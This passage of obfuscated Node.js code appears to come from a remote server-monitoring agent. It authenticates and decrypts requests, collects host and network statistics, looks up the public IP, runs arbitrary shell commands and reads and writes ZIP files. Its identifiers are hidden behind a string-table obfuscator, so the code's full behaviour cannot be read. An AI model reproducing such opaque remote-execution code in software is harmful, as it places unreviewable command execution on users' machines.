                            p = a[bB(0x5da)](t, Buffer[bB(0x3a5)](a0P['SESSION_KEY'], c['IvlvV']));
                        }
                        return f[bB(0x51f)](bB(0x61f), c[bB(0x464)]), f[bB(0x51f)](c['PrFqO'], a0P[bB(0x811)]), f['set'](c['rOsYA'], Buffer[bB(0x21a)](p, 'utf8')[bB(0x562)]()), h[bB(0x894)](this, p);
                    } else {
                        const u = typeof n === c['ahQYK'] ? n : JSON['stringify'](n);
                        return f[bB(0x51f)](c[bB(0x7ed)], Buffer[bB(0x21a)](u, 'utf8')[bB(0x562)]()), h[bB(0x894)](this, u);
                    }
                } catch (v) {
                    if (!f[bB(0x636)]) {
                        const w = JSON[bB(0x7cb)]({ 'error': bB(0x64a) + v[bB(0x56d)] });
                        return f[bB(0x126)](0x1f4), f[bB(0x51f)](c[bB(0x4c0)], c[bB(0x3bb)]), f[bB(0x51f)](bB(0x773), Buffer[bB(0x21a)](w, c[bB(0x25d)])[bB(0x562)]()), h['call'](this, w);
                    }
                    throw v;
                }
            return h[bB(0x894)](this, n);
        };
        const i = f[bA(0x712)];
        f[bA(0x712)] = function (...n) {
            const bC = bA;
            return a0P['DEBUG'] && !f[bC(0x858)](c['fFjfX']) && f[bC(0x51f)]('x-encrypted', c[bC(0x314)]), i[bC(0x4e4)](this, n);
        };
        if (c[bA(0x210)](d[bA(0x18c)], c[bA(0x73d)]) || d[bA(0x18c)] === bA(0x55c))
            return a0P[bA(0x4eb)] && f['set'](c[bA(0x749)], 'false'), g();
        d[bA(0x412)] = ![];
        const j = [
            c[bA(0x390)],
            c['UeGKs']
        ];
        if (a0P[bA(0x4eb)])
            return d[bA(0x412)] = !![], g();
        const k = d[bA(0x27c)][bA(0x786)] || d['headers'][c['fhEiI']], l = d[bA(0x27c)][c[bA(0x35c)]] || d['headers'][c['oIkaH']], m = d[bA(0x27c)][c[bA(0x466)]] || d[bA(0x27c)][c[bA(0x60f)]];
        if (c['VYEIU'](!k, !l) || !m)
            return j[bA(0x1be)](d['path']) ? c['nMmoS'](g) : f[bA(0x126)](0x191)[bA(0x738)]({ 'error': c[bA(0x348)] });
        try {
            let n = Buffer['alloc'](0x0);
            if (c[bA(0x5e5)](d[bA(0x785)], c[bA(0x6c4)])) {
                if (Buffer[bA(0x87c)](d[bA(0x737)]))
                    n = d['body'];
                else {
                    if (c[bA(0x242)](typeof d[bA(0x737)], bA(0x628)))
                        n = Buffer[bA(0x3a5)](d[bA(0x737)], bA(0x5ef));
                }
            }
            const o = n[bA(0x38d)] > 0x0 ? a0k[bA(0x337)](bA(0x276))[bA(0x522)](n)['digest'](c['QhJaF']) : '', p = b ? b[bA(0x707)]() : null, q = a[bA(0x322)](d[bA(0x18c)], d[bA(0x785)], o, k, l, m, p);
            d[bA(0x412)] = !![], d[bA(0x497)] = c['eCuKW'](q, c[bA(0x500)]) ? c['ddZZW'] : c['PaRif'];
        } catch (r) {
            return j['includes'](d[bA(0x785)]) ? c[bA(0x7f0)](g) : f[bA(0x126)](0x191)[bA(0x738)]({ 'error': bA(0x493) + r['message'] });
        }
        if (d[bA(0x737)] && c['eCuKW'](typeof d['body'], c[bA(0x271)])) {
            const s = c[bA(0x283)]((d[bA(0x27c)]['x-aes-encrypted'] || '')['toLowerCase'](), c[bA(0x464)]);
            try {
                if (s && d[bA(0x412)]) {
                    const t = Buffer[bA(0x3a5)](a0P[bA(0x7da)], c[bA(0x64c)]), u = a[bA(0x85f)](d[bA(0x737)], t);
                    d[bA(0x737)] = JSON[bA(0x1ef)](u);
                } else {
                    if (d[bA(0x737)][bA(0x1f5)](c[bA(0x3aa)])) {
                        const v = Buffer[bA(0x3a5)](d[bA(0x737)], c[bA(0x64c)])[bA(0x562)](c[bA(0x323)]);
                        d['body'] = JSON[bA(0x1ef)](v);
                    } else {
                        if (d[bA(0x737)][bA(0x1c8)]()[bA(0x1f5)]('{') || d[bA(0x737)][bA(0x1c8)]()[bA(0x1f5)]('['))
                            d[bA(0x737)] = JSON[bA(0x1ef)](d['body']);
                        else {
                            if (d[bA(0x737)][bA(0x1c8)]() === '')
                                d[bA(0x737)] = {};
                        }
                    }
                }
            } catch (w) {
                return a0D[bA(0x2ca)](bA(0x2a1) + w[bA(0x56d)]), f[bA(0x126)](0x190)[bA(0x738)]({ 'error': bA(0x167) + w['message'] });
            }
        }
        c[bA(0x43c)](g);
    };
}
class a0U {
    constructor() {
        const bD = a0aX, a = {
                'HXFEF': function (b, c) {
                    return b / c;
                }
            };
        this['lastNetworkStats'] = {
            'rx': 0x0,
            'tx': 0x0
        }, this['totalNetworkUp'] = 0x0, this[bD(0x3c0)] = 0x0, this[bD(0x3ef)] = a['HXFEF'](Date['now'](), 0x3e8);
    }
    async [a0aX(0x75e)]() {
        const bE = a0aX, a = {
                'kzKod': bE(0x214),
                'jgVbf': function (d, f, g) {
                    return d(f, g);
                },
                'TLYji': bE(0x66b),
                'EsmJC': bE(0x823),
                'jRLsu': function (d, f, g) {
                    return d(f, g);
                },
                'jrXTd': function (d, f) {
                    return d > f;
                },
                'yejUK': function (d, f) {
                    return d === f;
                },
                'iuEFL': function (d, f) {
                    return d(f);
                },
                'wxSMn': function (d, f) {
                    return d - f;
                }
            };
        let b = null, c = null;
        try {
            const d = (await a0m[bE(0x3d3)](a[bE(0x769)], 'utf8'))[bE(0x1c8)]();
            b = d === bE(0x12c) ? null : a[bE(0x735)](parseInt, d, 0xa), c = parseInt((await a0m['readFile'](bE(0x2f5), a[bE(0x4d0)]))[bE(0x1c8)](), 0xa);
        } catch {
            try {
                b = a[bE(0x735)](parseInt, (await a0m[bE(0x3d3)](a[bE(0x5ac)], a['TLYji']))['trim'](), 0xa), c = a[bE(0x672)](parseInt, (await a0m[bE(0x3d3)](bE(0x238), a[bE(0x4d0)]))[bE(0x1c8)](), 0xa);
                if (a[bE(0x530)](b, 0x7ffffffffffff000))
                    b = null;
            } catch {
                const f = await a0u[bE(0x550)]();
                b = f[bE(0x5de)], c = f[bE(0x2fc)];
            }
        }
        if (b === null) {
            const g = await a0u[bE(0x550)]();
            b = g['total'], (a['yejUK'](c, null) || a['iuEFL'](isNaN, c)) && (c = g[bE(0x2fc)]);
        }
        return {
            'total': b,
            'used': c,
            'available': a[bE(0x1fa)](b, c),
            'free': b - c,
            'cached': 0x0,
            'buffers': 0x0
        };
    }
    async [a0aX(0x43f)]() {
        const bF = a0aX, [a, b, c, d] = await Promise[bF(0x5aa)]([
                a0u[bF(0x253)](),
                this[bF(0x75e)](),
                a0u[bF(0x20c)](),
                a0u['networkInterfaces']()
            ]);
        let f = null, g = null;
        try {
            [f, g] = await Promise[bF(0x5aa)]([
                this[bF(0x225)](),
                this[bF(0x31a)]()
            ]);
        } catch (h) {
            a0D['debug']('获取\x20IP\x20地址失败:\x20' + h['message'], 0x1);
        }
        return {
            'arch': a0p[bF(0x29b)](),
            'cpu_cores': a[bF(0x299)],
            'cpu_name': a['brand'],
            'disk_total': (await a0u[bF(0x782)]())[0x0]?.[bF(0x221)] || 0x0,
            'gpu_name': '',
            'ipv4': f,
            'ipv6': g,
            'mem_total': b[bF(0x5de)],
            'os': c[bF(0x31f)] + '\x20' + c[bF(0x269)],
            'kernel_version': c[bF(0x403)],
            'swap_total': b[bF(0x46f)],
            'version': a0P['AGENT_VERSION'],
            'virtualization': await this[bF(0x805)](),
            'session_key': a0P[bF(0x7da)],
            'noise_key': a0P[bF(0x452)]
        };
    }
    ['getLocalIPv4']() {
        const bG = a0aX, a = {
                'KTNzB': function (c, d) {
                    return c === d;
                },
                'choaH': bG(0x1f0)
            }, b = a0p[bG(0x819)]();
        for (const c of Object['keys'](b)) {
            for (const d of b[c]) {
                const f = a['KTNzB'](d['family'], a[bG(0x774)]) || a[bG(0x3c4)](d[bG(0x478)], 0x4);
                if (f && !d[bG(0x6e7)]) {
                    if (!/^10\./[bG(0x328)](d[bG(0x37b)]) && !/^192\.168\./[bG(0x328)](d[bG(0x37b)]) && !/^172\.(1[6-9]|2[0-9]|3[0-1])\./['test'](d[bG(0x37b)]))
                        return d[bG(0x37b)];
                }
            }
        }
        return null;
    }
    async [a0aX(0x225)]() {
        const bH = a0aX, a = {
                'WPdZo': bH(0x224),
                'ypklB': bH(0x779),
                'QmNts': bH(0x863),
                'VMllQ': bH(0x4c7),
                'gkfHJ': bH(0x401)
            }, b = [
                a['WPdZo'],
                'https://icanhazip.com',
                a[bH(0x229)],
                a[bH(0x1bf)],
                'https://ipecho.net/plain',
                a['VMllQ'],
                a[bH(0x358)]
            ];
        for (const d of b) {
            try {
                const f = await this[bH(0x2b9)](d, 0x4);
                if (f && this[bH(0x7ab)](f))
                    return f;
            } catch (g) {
                continue;
            }
        }
        const c = this[bH(0x4ac)]();
        if (c && this[bH(0x7ab)](c))
            return c;
        return null;
    }
    [a0aX(0x471)]() {
        const bI = a0aX, a = {
                'hjDol': function (c, d) {
                    return c === d;
                },
                'SZJgg': 'IPv6',
                'YMaIv': bI(0x48f)
            }, b = a0p[bI(0x819)]();
        for (const c of Object[bI(0x524)](b)) {
            for (const d of b[c]) {
                const f = a[bI(0x5f6)](d['family'], a['SZJgg']) || a[bI(0x5f6)](d[bI(0x478)], 0x6);
                if (f && !d[bI(0x6e7)]) {
                    if (!d[bI(0x37b)][bI(0x118)]()[bI(0x1f5)](a[bI(0x585)]))
                        return d[bI(0x37b)];
                }
            }
        }
        return null;
    }
    async ['getPublicIpV6']() {
        const bJ = a0aX, a = this[bJ(0x471)]();
        if (a && this['isValidIPv6'](a))
            return a;
        const b = [
            bJ(0x5be),
            bJ(0x3e7),
            bJ(0x835)
        ];
        for (const c of b) {
            try {
                const d = await this[bJ(0x2b9)](c, 0x6);
                if (d && this['isValidIPv6'](d))
                    return d;
            } catch (f) {
                a0D[bJ(0x4b3)](bJ(0x41b) + c + '\x20失败:\x20' + f['message']);
                continue;
            }
        }
        return null;
    }
    async ['fetchIP'](a, b = 0x0) {
        const bK = a0aX, c = {
                'IDiGR': function (d, f) {
                    return d(f);
                },
                'tfXpE': bK(0x481),
                'DFujV': function (d, f) {
                    return d !== f;
                },
                'txbhY': bK(0x138),
                'GbkFQ': bK(0x712),
                'KDYtW': bK(0x2ca)
            };
        return new Promise((d, f) => {
            const bM = bK, g = {
                    'WtCEV': function (k, l) {
                        return c['DFujV'](k, l);
                    },
                    'gMjfo': function (k, l) {
                        const bL = a0b;
                        return c[bL(0x4db)](k, l);
                    },
                    'OAoAp': c[bM(0x26f)],
                    'lTKwW': c[bM(0x5ee)]
                }, h = c['IDiGR'](require, bM(0x4f8)), i = {
                    'timeout': 0x1388,
                    'family': b,
                    'headers': { 'Accept': 'text/plain' }
                }, j = h['get'](a, i, k => {
                    const bN = bM;
                    let l = '';
                    if (g[bN(0x5a7)](k[bN(0x608)], 0xc8)) {
                        g[bN(0x1bc)](f, new Error(bN(0x202) + k['statusCode']));
                        return;
                    }
                    k['on'](g['OAoAp'], m => l += m), k['on'](g[bN(0x289)], () => d(l['trim']()));
                });
            j['on'](c[bM(0x23f)], f), j[bM(0x70c)](0x1388, () => {
                const bO = bM;
                j[bO(0x56e)](), c[bO(0x4db)](f, new Error(c['tfXpE']));
            });
        });
    }
    [a0aX(0x7ab)](a) {
        const bP = a0aX;
        return /^(\d{1,3}\.){3}\d{1,3}$/[bP(0x328)](a);
    }
    [a0aX(0x22c)](a) {
        const bQ = a0aX;
        if (!/^[0-9a-fA-F:]+$/[bQ(0x328)](a) || !a[bQ(0x1be)](':'))
            return ![];
        if (/^(fe[89ab]|f[cd]|::1$|::$)/i[bQ(0x328)](a))
            return ![];
        return !![];
    }
    async [a0aX(0x6f4)]() {
        const bR = a0aX, a = {
                'tMWYi': function (m, n) {
                    return m / n;
                },
                'GeLzO': function (m, n) {
                    return m - n;
                },
                'HoFmL': function (m, n) {
                    return m - n;
                },
                'ADROt': function (m, n) {
                    return m * n;
                },
                'JmhNi': function (m, n) {
                    return m * n;
                },
                'DHMcm': function (m, n) {
                    return m / n;
                },
                'fJktG': function (m, n) {
                    return m / n;
                }
            }, [b, c, d, f] = await Promise[bR(0x5aa)]([
                a0u['currentLoad'](),
                a0u[bR(0x550)](),
                a0u[bR(0x1ae)](),
                a0u['currentLoad']()
            ]), g = d[0x0] || {
                'tx_bytes': 0x0,
                'rx_bytes': 0x0
            }, h = a[bR(0x787)](Date[bR(0x1d8)](), 0x3e8), i = a[bR(0x772)](h, this[bR(0x3ef)]), j = a[bR(0x772)](g['tx_bytes'], this[bR(0x70f)]['tx']), k = a[bR(0x3fa)](g[bR(0x3f2)], this[bR(0x70f)]['rx']);
        this[bR(0x1a2)] += j, this['totalNetworkDown'] += k, this[bR(0x70f)] = {
            'tx': g[bR(0x792)],
            'rx': g[bR(0x3f2)]
        }, this['lastNetworkTime'] = h;
        const l = await a0u[bR(0x12f)]();
        return {
            'cpu': { 'usage': Math[bR(0x1cf)](b[bR(0x7c9)]) },
            'ram': {
                'total': c[bR(0x5de)],
                'used': c['active']
            },
            'swap': {
                'total': c[bR(0x46f)],
                'used': c['swapused']
            },
            'load': {
                'load1': a[bR(0x787)](Math['round'](a[bR(0x1a9)](f[bR(0x117)], 0x64)), 0x64),
                'load5': a['tMWYi'](Math[bR(0x1cf)](a['JmhNi'](f[bR(0x117)], 0x64)), 0x64),
                'load15': a[bR(0x1ce)](Math[bR(0x1cf)](f[bR(0x117)] * 0x64), 0x64)
            },
            'disk': await this[bR(0x653)](),
            'network': {
                'up': Math[bR(0x1cf)](a[bR(0x501)](j, i)),
                'down': Math[bR(0x1cf)](k / i),
                'totalUp': this[bR(0x1a2)],
                'totalDown': this['totalNetworkDown']
            },
            'connections': await this[bR(0x834)](),
            'uptime': a0p[bR(0x1e7)](),
            'process': l?.[bR(0x5aa)] || 0x0,
            'message': ''
        };
    }
    async [a0aX(0x805)]() {
        const bS = a0aX, a = {
                'gMfrF': bS(0x618),
                'jUhJS': 'Docker',
                'SUzcb': bS(0x48e),
                'wDNld': bS(0x442),
                'suAFt': bS(0x578),
                'elrxc': bS(0x71c),
                'CHxTV': 'LXC',
                'eTFWh': bS(0x861),
                'mrdxm': 'utf8',
                'KOUVl': 'workdir=/var/lib/docker',
                'smagT': 'Kubernetes',
                'SYDQY': '/proc/1/environ',
                'nttOQ': '/proc/cpuinfo',
                'TPpaW': bS(0x292),
                'onKBC': bS(0x487),
                'OJRKG': bS(0x325)
            };
        try {
            if (a0l[bS(0x83e)](a[bS(0x4e6)]))
                return a[bS(0x186)];
            if (a0l[bS(0x83e)](bS(0x24b)))
                return a[bS(0x447)];
            if (a0l['existsSync'](a[bS(0x13f)])) {
                const b = a0l[bS(0x518)](a[bS(0x13f)], bS(0x66b))[bS(0x118)]();
                if (b[bS(0x1be)](a[bS(0x473)]) || b[bS(0x1be)](bS(0x192)))
                    return bS(0x4f1);
                else {
                    if (b[bS(0x1be)](bS(0x646)))
                        return 'Kubernetes';
                    else {
                        if (b['includes'](a['elrxc']))
                            return a['CHxTV'];
                    }
                }
            }
            if (a0l[bS(0x83e)](a[bS(0x37a)])) {
                const c = a0l['readFileSync'](a[bS(0x37a)], a[bS(0x7d5)]);
                if (c[bS(0x1be)]('/docker/containers/') || c['includes'](a['KOUVl']))
                    return a[bS(0x186)];
                else {
                    if (c[bS(0x1be)]('/pods/') || c['includes'](bS(0x1fb)))
                        return a[bS(0x4c3)];
                }
            }
            if (a0l[bS(0x83e)](a[bS(0x5cb)])) {
                const d = a0l[bS(0x518)](a['SYDQY'], a[bS(0x7d5)]);
                if (d['includes']('container=lxc'))
                    return 'LXC';
            }
            if (a0l[bS(0x83e)](a[bS(0x488)])) {
                const f = a0l[bS(0x518)](a['nttOQ'], a[bS(0x7d5)]);
                if (f[bS(0x1be)](a[bS(0x4df)]) || f[bS(0x1be)](a[bS(0x689)]))
                    return a['TPpaW'];
            }
        } catch (g) {
        }
        return a[bS(0x5f8)];
    }
    async [a0aX(0x653)]() {
        const bT = a0aX, a = {
                'SCNLJ': function (b, c) {
                    return b > c;
                },
                'EyVQo': bT(0x80d),
                'GHiIE': function (b, c) {
                    return b !== c;
                },
                'YtjVS': bT(0x69f)
            };
        try {
            const b = await a0u[bT(0x782)](), c = b[bT(0x597)](g => {
                    const bU = bT;
                    return a[bU(0x4af)](g[bU(0x221)], 0x0) && g[bU(0x40e)] !== a['EyVQo'] && a['GHiIE'](g[bU(0x40e)], a['YtjVS']) && g['fs']['startsWith']('/dev/');
                }), d = c[bT(0x129)]((g, h) => g + h[bT(0x221)], 0x0), f = c[bT(0x129)]((g, h) => g + h[bT(0x2fc)], 0x0);
            return {
                'total': d,
                'used': f
            };
        } catch {
            return {
                'total': 0x0,
                'used': 0x0
            };
        }
    }
    async [a0aX(0x834)]() {
        const bV = a0aX;
        try {
            const a = await a0u['networkConnections'](), b = a[bV(0x597)](d => d[bV(0x112)] === 'tcp')[bV(0x38d)], c = a['filter'](d => d['protocol'] === bV(0x829))[bV(0x38d)];
            return {
                'tcp': b,
                'udp': c
            };
        } catch {
            return {
                'tcp': 0x0,
                'udp': 0x0
            };
        }
    }
}
class a0V {
    static async ['execute'](a, b = {}) {
        const bW = a0aX, c = {
                'taMgo': function (d, f) {
                    return d - f;
                },
                'yyGBp': function (d, f) {
                    return d || f;
                },
                'LuRAe': function (d, f) {
                    return d === f;
                },
                'qOyoF': bW(0x88a),
                'kQeyT': function (d, f) {
                    return d(f);
                },
                'ObxUY': function (d, f, g, h) {
                    return d(f, g, h);
                },
                'KwuCO': function (d, f) {
                    return d * f;
                },
                'tYSiV': function (d, f) {
                    return d * f;
                }
            }, {
                cwd: cwd = process[bW(0x60e)](),
                env: env = {},
                timeout: timeout = a0P[bW(0x220)]
            } = b;
        return new Promise(d => {
            const bX = bW, f = Date[bX(0x1d8)](), g = c[bX(0x76b)](a0r, a, {
                    'cwd': cwd,
                    'env': {
                        ...process.env,
                        ...env
                    },
                    'timeout': c['KwuCO'](timeout, 0x3e8),
                    'maxBuffer': c[bX(0x43d)](0xa, 0x400) * 0x400
                }, (h, i, j) => {
                    const bY = bX, k = c['taMgo'](Date[bY(0x1d8)](), f), l = h && h[bY(0x2d5)] && h[bY(0x7b2)];
                    let m = c['yyGBp'](i, '');
                    if (j)
                        m += j;
                    let n = 0x0;
                    if (h) {
                        if (l)
                            n = 0x7c;
                        else
                            c[bY(0x79e)](typeof h[bY(0x326)], c[bY(0x4e0)]) ? n = h[bY(0x326)] : n = -0x1;
                    }
                    c[bY(0x510)](d, {
                        'result': m,
                        'exitcode': n,
                        'timeout': l,
                        'cmd': a
                    });
                });
        });
    }
}
function a0W(a) {
    const bZ = a0aX;
    try {
        const b = a0l[bZ(0x45c)]['native'](a0o[bZ(0x409)](a0P[bZ(0x13c)])), c = a0o[bZ(0x409)](a);
        let d = c;
        while (!a0l[bZ(0x83e)](d)) {
            const i = a0o[bZ(0x664)](d);
            if (i === d)
                return ![];
            d = i;
        }
        const f = a0l[bZ(0x45c)][bZ(0x891)](d), g = a0o[bZ(0x1dc)](b, f);
        if (g[bZ(0x1f5)]('..') || a0o[bZ(0x29e)](g))
            return ![];
        const h = a0o[bZ(0x1dc)](d, c);
        if (h && (h[bZ(0x1f5)]('..') || a0o[bZ(0x29e)](h)))
            return ![];
        return !![];
    } catch (j) {
        return ![];
    }
}
class a0X {
    static [a0aX(0x806)] = 0x4e20;
    static ['ZIP_MAX_TOTAL_BYTES'] = 0x200 * 0x400 * 0x400;
    static ['ZIP_MAX_LISTED_FILES'] = 0x1f4;
    static [a0aX(0x54b)] = null;
    static [a0aX(0x62e)](a) {
        const c0 = a0aX, b = {
                'zgEng': function (g, h) {
                    return g < h;
                },
                'ljgOj': function (g, h) {
                    return g & h;
                },
                'qyoWe': function (g, h) {
                    return g ^ h;
                },
                'QEcaY': function (g, h) {
                    return g >>> h;
                },
                'aXVGo': function (g, h) {
                    return g >>> h;
                },
                'nMsYH': function (g, h) {
                    return g ^ h;
                }
            };
        if (!a0X['_crcTable']) {
            const g = new Int32Array(0x100);
            for (let h = 0x0; b[c0(0x6cd)](h, 0x100); h++) {
                let j = h;
                for (let l = 0x0; b['zgEng'](l, 0x8); l++)
                    j = b[c0(0x339)](j, 0x1) ? b[c0(0x16e)](0xedb88320, b[c0(0x860)](j, 0x1)) : b['QEcaY'](j, 0x1);
                g[h] = j;
            }
            a0X['_crcTable'] = g;
        }
        const d = a0X['_crcTable'];
        let f = -0x1;
        for (let m = 0x0; b[c0(0x6cd)](m, a[c0(0x38d)]); m++)
            f = b[c0(0x5d1)](f, 0x8) ^ d[b['ljgOj'](b[c0(0x16e)](f, a[m]), 0xff)];
        return b['nMsYH'](f, -0x1) >>> 0x0;
    }
    static [a0aX(0x254)](a) {
        const c1 = a0aX, b = {
                'mXQAv': function (g, h) {
                    return g & h;
                },
                'VZPuo': function (g, h) {
                    return g << h;
                },
                'SXfcp': function (g, h) {
                    return g >> h;
                },
                'RFeci': function (g, h) {
                    return g & h;
                },
                'rBEjO': function (g, h) {
                    return g | h;
                },
                'CSvpG': function (g, h) {
                    return g << h;
                },
                'OBpsk': function (g, h) {
                    return g - h;
                },
                'nSbzq': function (g, h) {
                    return g << h;
                },
                'ggStt': function (g, h) {
                    return g + h;
                }
            }, c = b[c1(0x87d)](b[c1(0x11b)](a[c1(0x32a)](), 0xb) | a[c1(0x73b)]() << 0x5 | b[c1(0x111)](a['getSeconds'](), 0x1), 0xffff), f = b[c1(0x26e)](b[c1(0x660)](b[c1(0x313)](b[c1(0x256)](a['getFullYear'](), 0x7bc), 0x9) | b[c1(0x275)](b[c1(0x2f8)](a[c1(0x679)](), 0x1), 0x5), a[c1(0x4ad)]()), 0xffff);
        return {
            'time': c,
            'date': f
        };
    }
    static [a0aX(0x3b7)](a) {
        const c2 = a0aX, b = {
                'MrPYH': function (i, j) {
                    return i < j;
                },
                'JWeua': function (i, j) {
                    return i >= j;
                },
                'xNmGM': c2(0x66b),
                'cDnrn': function (i, j) {
                    return i < j;
                },
                'ghdQI': function (i, j) {
                    return i(j);
                },
                'tmDDZ': function (i, j) {
                    return i(j);
                },
                'KAICz': function (i, j) {
                    return i + j;
                },
                'lSzQC': function (i, j) {
                    return i(j);
                }
            }, c = a0l[c2(0x521)](a, 'w'), d = [];
        let f = 0x0, g = 0x0;
        const h = i => {
            const c3 = c2;
            let j = 0x0;
            while (b['MrPYH'](j, i[c3(0x38d)]))
                j += a0l[c3(0x274)](c, i, j, i['length'] - j);
        };
        return {
            'add'(i, j, k, l = ![]) {
                const c4 = c2;
                if (b[c4(0x5dc)](g, a0X[c4(0x806)]))
                    return ![];
                const m = Buffer[c4(0x3a5)](i, b['xNmGM']);
                j = j || Buffer[c4(0x252)](0x0);
                const n = l ? 0x0 : a0X[c4(0x62e)](j);
                let o = 0x0, p = j;
                if (!l && j['length'] > 0x0) {
                    const u = a0n[c4(0x576)](j, { 'level': 0x6 });
                    b['cDnrn'](u[c4(0x38d)], j['length']) && (o = 0x8, p = u);
                }
                const {
                        time: q,
                        date: r
                    } = a0X[c4(0x254)](k || new Date()), s = Buffer[c4(0x252)](0x1e);
                s[c4(0x34b)](0x4034b50, 0x0), s[c4(0x2e7)](0x14, 0x4), s[c4(0x2e7)](0x800, 0x6), s[c4(0x2e7)](o, 0x8), s[c4(0x2e7)](q, 0xa), s[c4(0x2e7)](r, 0xc), s['writeUInt32LE'](n, 0xe), s[c4(0x34b)](p[c4(0x38d)], 0x12), s[c4(0x34b)](j['length'], 0x16), s[c4(0x2e7)](m[c4(0x38d)], 0x1a), s[c4(0x2e7)](0x0, 0x1c), b[c4(0x305)](h, s), b[c4(0x2ff)](h, m), h(p);
                const t = Buffer[c4(0x252)](0x2e);
                return t[c4(0x34b)](0x2014b50, 0x0), t['writeUInt16LE'](0x14, 0x4), t[c4(0x2e7)](0x14, 0x6), t[c4(0x2e7)](0x800, 0x8), t[c4(0x2e7)](o, 0xa), t[c4(0x2e7)](q, 0xc), t[c4(0x2e7)](r, 0xe), t[c4(0x34b)](n, 0x10), t[c4(0x34b)](p[c4(0x38d)], 0x14), t[c4(0x34b)](j['length'], 0x18), t[c4(0x2e7)](m[c4(0x38d)], 0x1c), t[c4(0x2e7)](0x0, 0x1e), t[c4(0x2e7)](0x0, 0x20), t[c4(0x2e7)](0x0, 0x22), t[c4(0x2e7)](0x0, 0x24), t[c4(0x34b)](l ? 0x10 : 0x0, 0x26), t[c4(0x34b)](f, 0x2a), d[c4(0x4a7)](t, m), f += b[c4(0x867)](0x1e, m[c4(0x38d)]) + p[c4(0x38d)], g++, !![];
            },
            'close'() {
                const c5 = c2, i = Buffer[c5(0x83f)](d), j = Buffer[c5(0x252)](0x16);
                return j[c5(0x34b)](0x6054b50, 0x0), j[c5(0x2e7)](0x0, 0x4), j[c5(0x2e7)](0x0, 0x6), j['writeUInt16LE'](g, 0x8), j[c5(0x2e7)](g, 0xa), j[c5(0x34b)](i[c5(0x38d)], 0xc), j[c5(0x34b)](f, 0x10), j[c5(0x2e7)](0x0, 0x14), b[c5(0x89e)](h, i), b[c5(0x2ff)](h, j), a0l[c5(0x780)](c), g;
            }
        };
    }
    static [a0aX(0x1ef)](a) {
        const c6 = a0aX, b = {
                'MigRz': function (n, o) {
                    return n - o;
                },
                'EkTis': function (n, o) {
                    return n + o;
                },
                'qJdvQ': function (n, o) {
                    return n === o;
                },
                'BXPRv': function (n, o) {
                    return n < o;
                },
                'nGjUx': c6(0x369),
                'oUawi': function (n, o) {
                    return n + o;
                },
                'pIrmO': function (n, o) {
                    return n < o;
                },
                'YYlrn': function (n, o) {
                    return n <= o;
                },
                'xIvbl': function (n, o) {
                    return n + o;
                },
                'iwXXX': function (n, o) {
                    return n !== o;
                },
                'ktxeO': function (n, o) {
                    return n + o;
                },
                'tWDEX': function (n, o) {
                    return n + o;
                },
                'WwPqb': function (n, o) {
                    return n + o;
                },
                'VIhMU': function (n, o) {
                    return n !== o;
                },
                'gNxIV': function (n, o) {
                    return n & o;
                },
                'SEtXQ': function (n, o) {
                    return n === o;
                },
                'QygyZ': function (n, o) {
                    return n <= o;
                },
                'TrYzZ': function (n, o) {
                    return n + o;
                },
                'fbmuM': function (n, o) {
                    return n === o;
                },
                'DYnuB': function (n, o) {
                    return n + o;
                },
                'QvJfS': function (n, o) {
                    return n + o;
                },
                'JKbMb': function (n, o) {
                    return n <= o;
                }
            }, c = a0l['readFileSync'](a);
        let d = -0x1;
        const f = Math[c6(0x12c)](0x0, b[c6(0x6d7)](c[c6(0x38d)], b[c6(0x761)](0xffff, 0x16)));
        for (let n = b[c6(0x6d7)](c[c6(0x38d)], 0x16); n >= f; n--) {
            if (b[c6(0x60a)](c['readUInt32LE'](n), 0x6054b50)) {
                d = n;
                break;
            }
        }
        if (b['BXPRv'](d, 0x0))
            throw new Error(b[c6(0x384)]);
        const g = c[c6(0x796)](d + 0xa), h = c[c6(0x808)](b[c6(0x761)](d, 0xc)), j = c[c6(0x808)](b['oUawi'](d, 0x10)), k = [];
        let l = j;
        const m = b[c6(0x761)](j, h);
        for (let o = 0x0; b['pIrmO'](o, g) && b[c6(0x25b)](b[c6(0x351)](l, 0x2e), m); o++) {
            if (b['iwXXX'](c[c6(0x808)](l), 0x2014b50))
                break;
            const q = c['readUInt16LE'](b['oUawi'](l, 0x8)), r = c[c6(0x796)](l + 0xa), s = c[c6(0x808)](l + 0x10), t = c[c6(0x808)](b[c6(0x4e3)](l, 0x14)), u = c['readUInt32LE'](b[c6(0x4e3)](l, 0x18)), v = c[c6(0x796)](b['ktxeO'](l, 0x1c)), w = c[c6(0x796)](b[c6(0x4e3)](l, 0x1e)), x = c[c6(0x796)](b[c6(0x351)](l, 0x20)), y = c['readUInt32LE'](b['tWDEX'](l, 0x26)), z = c[c6(0x808)](l + 0x2a), A = c[c6(0x6fd)](l + 0x2e, b[c6(0x286)](b['tWDEX'](l, 0x2e), v))[c6(0x562)](c6(0x66b));
            l += b[c6(0x2e0)](0x2e, v) + w + x;
            const B = {
                'name': A,
                'isDir': A['endsWith']('/') || b[c6(0x42b)](b[c6(0x871)](y, 0x10), 0x0),
                'method': r,
                'crc': s,
                'size': u,
                'compressedSize': t,
                'encrypted': b['iwXXX'](b['gNxIV'](q, 0x1), 0x0),
                'zip64': b[c6(0x60a)](t, 0xffffffff) || u === 0xffffffff || b[c6(0x852)](z, 0xffffffff),
                'data': null
            };
            if (!B[c6(0x504)] && !B[c6(0x6e5)] && !B[c6(0x217)]) {
                if (b['QygyZ'](b['TrYzZ'](z, 0x1e), c[c6(0x38d)]) && b[c6(0x843)](c[c6(0x808)](z), 0x4034b50)) {
                    const C = c[c6(0x796)](b[c6(0x16d)](z, 0x1a)), D = c[c6(0x796)](b[c6(0x351)](z, 0x1c)), E = b[c6(0x5e3)](z + 0x1e + C, D);
                    b[c6(0x5b1)](b[c6(0x351)](E, t), c[c6(0x38d)]) && (B[c6(0x138)] = c['slice'](E, b[c6(0x4e3)](E, t)));
                }
            }
            k['push'](B);
        }
        return k;
    }
    static [a0aX(0x61c)](a) {
        const c7 = a0aX, b = {
                'hXLgU': function (c, d) {
                    return c === d;
                },
                'vFFKm': function (c, d) {
                    return c === d;
                }
            };
        if (b[c7(0x445)](a[c7(0x18c)], 0x0))
            return a[c7(0x138)];
        if (b['vFFKm'](a['method'], 0x8))
            return a0n['inflateRawSync'](a[c7(0x138)]);
        throw new Error(c7(0x23e) + a[c7(0x18c)]);
    }
}
class a0Y {
    static async [a0aX(0x4d8)](a, b = ![]) {
        const c8 = a0aX, c = {
                'cuMkt': c8(0x3e4),
                'uqieN': c8(0x2bc),
                'xNeiT': function (h, i) {
                    return h & i;
                },
                'dRUvK': function (h, i) {
                    return h || i;
                },
                'UdUau': function (h, i) {
